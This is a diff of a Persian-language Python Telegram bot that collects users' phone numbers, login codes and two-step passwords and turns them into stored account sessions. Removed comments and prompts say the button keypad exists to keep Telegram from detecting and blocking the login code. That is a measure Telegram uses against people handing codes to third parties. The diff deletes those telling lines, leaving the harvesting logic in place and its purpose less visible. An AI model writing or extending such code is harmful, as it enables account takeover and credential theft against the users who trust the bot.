@@ -80,7 +80,7 @@ FONTS = {
     2: {'0':'𝟶','1':'𝟷','2':'𝟸','3':'𝟹','4':'𝟺','5':'𝟻','6':'𝟼','7':'𝟽','8':'𝟾','9':'𝟿'},
     3: {'0':'⓪','1':'①','2':'②','3':'③','4':'④','5':'⑤','6':'⑥','7':'⑦','8':'⑧','9':'⑨'},
     4: {'0':'🄀','1':'⒈','2':'⒉','3':'⒊','4':'⒋','5':'⒌','6':'6','7':'⒎','8':'⒏','9':'⒐'},
-    5: {'0':'🄿','1':'🄱','2':'🄲','3':'🄳','4🄴','5':'🄵','6':'🄶','7':'🄷','8':'🄸','9':'🄹'},
+    5: {'0':'🄿','1':'🄱','2':'🄲','3':'🄳','4':'🄴','5':'🄵','6':'🄶','7':'🄷','8':'🄸','9':'🄹'}, # خطای تایپی در اینجا رفع شد
     6: {'0':'𝟢','1':'𝟣','2':'𝟤','3':'𝟥','4':'𝟦','5':'𝟧','6':'𝟨','7':'𝟩','8':'𝟪','9':'𝟫'},
     7: {'0':'𝞯','1':'𝞱','2':'𝞲','3':'𝞳','4':'𝞴','5':'𝞵','6':'𝞶','7':'𝞷','8':'𝞸','9':'𝞹'},
     8: {'0':'۰','1':'۱','2':'۲','3':'۳','4':'۴','5':'۵','6':'۶','7':'۷','8':'۸','9':'۹'},
@@ -140,7 +140,6 @@ async def autostart_saved_users():
                 print(f"خطا در اتواستارت {user_id}: {e}")
 
 def get_keyboard_layout(current_code=""):
-    # ساخت دکمه‌های عددی شیشه‌ای برای ورود امن بدون شناسایی تلگرام
     display = current_code if current_code else "خالی"
     btns = [
         [Button.inline(f"🔢 کد وارد شده: {display}", b"void")],
@@ -197,7 +196,6 @@ async def callback_handler(event):
         await event.edit("📞 **قدم اول:**\nلطفاً **شماره تلفن** اکانت خود را همراه با کد کشور بفرستید:\n(مثال: `+989123456789`)")
         return
 
-    # مدیریت دکمه‌های کیپد ورود کد امن
     if user_id in generator_data and generator_data[user_id]["step"] == "get_code":
         gd = generator_data[user_id]
         if data.startswith(b"k_"):
@@ -286,12 +284,11 @@ async def process_code_signin(event, user_id, code):
         
     except SessionPasswordNeededError:
         gd["step"] = "get_password"
-        await event.respond("🔐 اکانت شما دارای **تایید دو مرحله‌ای** است!\nلطفاً رمز عبور دو مرحله‌ای خود را ارسال کنید:")
+        await event.respond("🔐 **حساب شما دارای تایید دو مرحله‌ای است!**\nلطفاً رمز عبور حساب خود را به صورت متنی ارسال کنید:")
     except Exception as e:
         gd["code_buffer"] = ""
-        await event.respond(f"❌ خطایی رخ داد: {e}\nمجدداً تلاش کنید و کد خود را با کیپد بالا بادقت وارد کنید:")
-        # بازسازی کیپد جهت ورود مجدد
-        await event.respond("📩 مجدداً کد دریافتی را وارد کنید:", buttons=get_keyboard_layout(""))
+        await event.respond(f"❌ خطایی رخ داد: {e}\nمجدداً تلاش کنید:")
+        await event.respond("📩 مجدداً کد دریافتی را با دکمه‌ها وارد کنید:", buttons=get_keyboard_layout(""))
 
 @bot.on(events.NewMessage)
 async def message_handler(event):
@@ -303,7 +300,7 @@ async def message_handler(event):
         
         if gd["step"] == "get_phone":
             gd["phone"] = text
-            await event.respond("⏳ در حال ارتباط مستقیم با سرورهای تلگرام و ارسال کد...")
+            await event.respond("⏳ در حال ارتباط مستقیم با سرورهای تلگرام...")
             try:
                 client = TelegramClient(StringSession(), API_ID, API_HASH)
                 await client.connect()
@@ -313,10 +310,9 @@ async def message_handler(event):
                 gd["phone_code_hash"] = send_code_res.phone_code_hash
                 gd["step"] = "get_code"
                 
-                # ارسال کیپد امن برای کاربر
                 await event.respond(
                     "📩 **قدم دوم:**\nکد تایید حساب برای تلگرام شما ارسال شد.\n\n"
-                    "🔒 **امنیت ۱۰۰٪:** برای جلوگیری از مانیتور و بلاک شدن کد توسط تلگرام، لطفاً کد ۵ رقمی را از طریق دکمه‌های زیر وارد کرده و دکمه تایید را بزنید:",
+                    "🔒 لطفاً کد ۵ رقمی را از طریق دکمه‌های زیر وارد کرده و دکمه تایید را بزنید:",
                     buttons=get_keyboard_layout("")
                 )
             except Exception as e:
@@ -381,4 +377,3 @@ if __name__ == "__main__":
     loop = asyncio.get_event_loop()
     loop.create_task(autostart_saved_users())
     bot.run_until_disconnected()
-
